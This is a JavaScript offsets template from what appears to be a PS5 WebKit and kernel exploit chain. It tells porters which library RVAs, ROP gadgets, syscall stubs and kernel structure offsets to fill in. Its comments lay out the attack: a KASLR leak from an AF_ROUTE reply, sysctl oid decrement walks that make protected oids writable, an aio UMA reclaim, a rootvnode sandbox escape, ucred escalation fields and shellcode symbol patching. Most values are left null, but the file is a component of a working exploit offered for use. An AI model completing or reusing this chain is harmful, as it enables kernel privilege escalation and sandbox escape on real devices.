/*
 * Offsets template. Copy to offsets/<version>.js, fill in every value, and add
 * "<version>" to SUPPORTED in firmware.js.
 *
 * Conventions
 * -----------
 * Userland values are module-relative RVAs (file offset = rva + 0x4000) taken
 * from libSceNKWebKit, libkernel_web and libSceLibcInternal.
 *
 * Kernel values are relative to the kernel text base, i.e. vaddr - 0xffffffff80210000
 * on the builds seen so far. Confirm that constant against your own dump before
 * trusting anything below it.
 *
 * Nothing here is optional. exploit.js validates the whole KRW table before it
 * touches the kernel and names every key that is missing, so work through one
 * failing run rather than one reboot per value.
 *
 * Deriving these against a firmware the chain has never run on is the dangerous
 * part, not the port itself: every address below is written to absolutely, and
 * a wrong one is a kernel panic. Where a value is listed with a "prove it with"
 * note, do that before the first run.
 */

/* -- libSceNKWebKit ------------------------------------------------------- */

// webkitBase = nativeCtorAddr - candidate. main.js tries each in turn and keeps
// the one that lands page-aligned inside the user module range.
const OFFSET_wk_host_constructor_candidates = [];
// Any exact, unique WebKit export; used only as a "did the offsets load" marker.
const OFFSET_wk_vtable_first_element        = null;
const OFFSET_wk_memset_import               = null;
const OFFSET_wk___stack_chk_guard_import    = null;

/* -- libkernel_web -------------------------------------------------------- */

const OFFSET_lk___stack_chk_guard                = null;
// Private `thread_list` global. main.js can resolve this at runtime by scanning
// for its reference signature, so leaving it null is survivable.
const OFFSET_lk__thread_list                     = null;
// The instruction the hijacked worker returns to. main.js fingerprints the saved
// PC at runtime and only falls back to this.
const OFFSET_lk_worker_wait_return               = null;

const OFFSET_lk_getpid                           = null;
const OFFSET_lk_sysctlbyname                     = null;
const OFFSET_lk_sceKernelSendNotificationRequest = null;

const OFFSET_lk_pthread_create                   = null;
// Preferred by the kexp spawn: a NULL attr makes the payload thread inherit our
// affinity mask. If this firmware does not export it, leave it null and
// pthread_create is used instead.
const OFFSET_lk_pthread_create_name_np           = null;
const OFFSET_lk_pthread_join                     = null;
const OFFSET_lk_pthread_exit                     = null;

const OFFSET_lk_scePthreadCreate                 = null;
const OFFSET_lk_scePthreadJoin                   = null;
const OFFSET_lk_scePthreadAttrInit               = null;
const OFFSET_lk_scePthreadAttrSetstacksize       = null;
const OFFSET_lk_scePthreadAttrSetdetachstate     = null;
const OFFSET_lk_scePthreadAttrDestroy            = null;

/* -- libSceLibcInternal --------------------------------------------------- */

const OFFSET_lc_malloc    = null;
const OFFSET_lc_free      = null;
const OFFSET_lc_memcpy    = null;
const OFFSET_lc_memset    = null;
const OFFSET_lc_memcmp    = null;
const OFFSET_lc_strcmp    = null;
const OFFSET_lc_vsnprintf = null;
const OFFSET_lc_setjmp    = null;
const OFFSET_lc_longjmp   = null;

const OFFSET_WORKER_STACK_OFFSET = null;

/* -- ROP gadgets and syscall stubs ---------------------------------------- */

// Both tables are generated, not written by hand. Keep the exact key spelling
// from an existing offsets file; main.js looks gadgets up by name and syscall
// stubs by number.
const wk_gadgetmap = {};
const syscall_map = {};

/* -- kernel, harness-facing ----------------------------------------------- */

const OFFSET_KERNEL_DATA           = null;
const OFFSET_KERNEL_ALLPROC        = null;
const OFFSET_KERNEL_ROOTVNODE      = null;
const OFFSET_KERNEL_SECURITY_FLAGS = null;
const OFFSET_KERNEL_TARGETID       = null;
const OFFSET_KERNEL_QA_FLAGS       = null;
const OFFSET_KERNEL_UTOKEN_FLAGS   = null;

/* -- kernel, exploit-facing ----------------------------------------------- */

window.KRW = {
    firmware: "0.00",

    kernelData: OFFSET_KERNEL_DATA,
    // LIST_HEAD of struct proc. Prove it with the LIST_INSERT_HEAD of proc0 in
    // the kernel's init path: the same basic block writes allproc and proves
    // p_list sits at proc+0x00.
    allproc: OFFSET_KERNEL_ALLPROC,
    // The rootvnode global. Read once for the sandbox escape. If it is wrong the
    // chain falls back to walking allproc to the kernel proc, but that walk is
    // not reliable on every build -- get this right.
    rootvnode: OFFSET_KERNEL_ROOTVNODE,

    // The kernel return address left in an AF_ROUTE reply's author record.
    // kbase = ret - retStatic; retLow16 is the low 16 bits of that address,
    // which KASLR does not move, and is used as a signature check.
    kaslr: { mode: "rtmsg2", retStatic: null, retLow16: null },

    /*
     * Three sysctl oids. Pick them out of the kernel's sysctl set:
     *
     *   a  a CTLTYPE_INT oid with a reachable name, whose arg1 sits exactly
     *      0x100 above b's arg1 so one decrement re-points it, and whose arg2
     *      is never read (arg1 != 0) so it can absorb the first decrement of
     *      every walk;
     *   b  a CTLTYPE_INT oid 0x100 below a, ideally hidden, which becomes the
     *      address window;
     *   c  any CTLTYPE_INT oid with a STATIC mib and no kernel reader, used to
     *      write the window's high dword.
     *
     * kern.smp.cpus / kern.smp.maxcpus and the p1003_1b family have all three
     * properties on the builds seen so far.
     *
     * kindByte3 is the byte-3 dword of the kind field: sixteen decrements walk
     * its top byte from the SECURE value to the ANYBODY one with no borrow.
     * Check the visibility field's offset against this kernel's sysctl_oid
     * layout -- it moved between FreeBSD 11 and 13.
     */
    oid: {
        originalKind: 0x80048002,
        writableKind: 0x70048002,
        a: {
            base: null, kind: null, kindByte3: null,
            arg1: null, arg1Byte1: null, arg1Value: null, deadSink: null,
        },
        b: {
            base: null, kind: null, kindByte3: null,
            arg1: null, arg1Value: null, visible: null,
        },
        c: { base: null, kind: null, arg1: null, arg1Value: null, mib: [] },
    },

    // An int the kernel never reads or writes, reachable through a static mib.
    // Used to count decrement walks and as the write self-test target.
    walkCounter: { addr: null, mib: [] },

    // Any initialised mutex. A reclaimed waiter node's +0x10 must be the mutex
    // STRUCT base, which is the lockword address minus 0x18.
    nodeMutex: null,

    // Any string pair in .rodata, used to prove the fast R/W reads what the
    // firmware image says it should. Keep the NUL, it is part of the check.
    rodataProbe: { rva: null, text: "" },

    /*
     * aio internals. waiterSize * (waiters) and requestSize * (requests) must
     * land in the SAME UMA size class or the reclaim cannot work -- exploit.js
     * checks this and refuses to fire otherwise.
     *
     * idTable describes the two-level id table id_lookup walks: pages is the
     * page-count field, slotStride the per-slot size, entryType the type word
     * every aio entry carries.
     */
    aio: {
        waiterSize: 0x38,
        requestSize: 0x28,
        group: { num: 0x00, state: 0x08, waiters: 0x50 },
        idTable: { pages: null, slotStride: 0x30, entryType: 0x160 },
    },

    // struct proc. p_aioinfo and p_fd are the ones worth proving: a wrong
    // p_aioinfo breaks the teardown silently, and a wrong p_fd is a wild write.
    proc: { pid: null, ucred: null, fd: null, aioInfo: null, dynlib: null },
    kernelPid: 0,

    // struct ucred. Stable across PS5 firmwares so far; the escalation is gated
    // on getuid() and is_in_sandbox(), so a wrong field fails the check rather
    // than panicking.
    ucred: {
        uid: 0x04, ruid: 0x08, svuid: 0x0c, ngroups: 0x10, rgid: 0x14, svgid: 0x18,
        sceAuthId: 0x58, sceCaps: 0x60, sceCaps1: 0x68, sceAttrs: 0x80,
    },
    sysCoreAuthId: { lo: null, hi: null },

    filedesc:      { files: 0x00, cdir: 0x08, rdir: 0x10, jdir: 0x18 },
    filedescTable: { nfiles: 0x00, ofiles: 0x08, entryStride: 0x30, fileData: 0x00 },

    // struct pipe.pipe_buffer plus the pipepair back-pointer. defaultSize must
    // be the exact size pipe_write accepts without reallocating the buffer.
    pipe: {
        count: 0x00, in: 0x04, out: 0x08, size: 0x0c, buffer: 0x10,
        pair: null, defaultSize: 0x4000,
    },

    dynlib: { syscallStart: null, syscallEnd: null, restrictFlags: null, libkernelRef: null },
};

/* -- symbols the kexp handoff patches into its shellcode ------------------- */

// Omit anything this firmware does not publish; kexp.js parses the loaded
// module image for whatever is left.
window.SYMBOLS = {
    libkernel: {
        getpid:                           OFFSET_lk_getpid,
        sysctlbyname:                     OFFSET_lk_sysctlbyname,
        sceKernelSendNotificationRequest: OFFSET_lk_sceKernelSendNotificationRequest,
        pthread_create:                   OFFSET_lk_pthread_create,
        pthread_create_name_np:           OFFSET_lk_pthread_create_name_np,
        pthread_join:                     OFFSET_lk_pthread_join,
    },
    libc: {
        malloc:    OFFSET_lc_malloc,
        free:      OFFSET_lc_free,
        memcpy:    OFFSET_lc_memcpy,
        memset:    OFFSET_lc_memset,
        strcmp:    OFFSET_lc_strcmp,
        memcmp:    OFFSET_lc_memcmp,
        vsnprintf: OFFSET_lc_vsnprintf,
    },
};
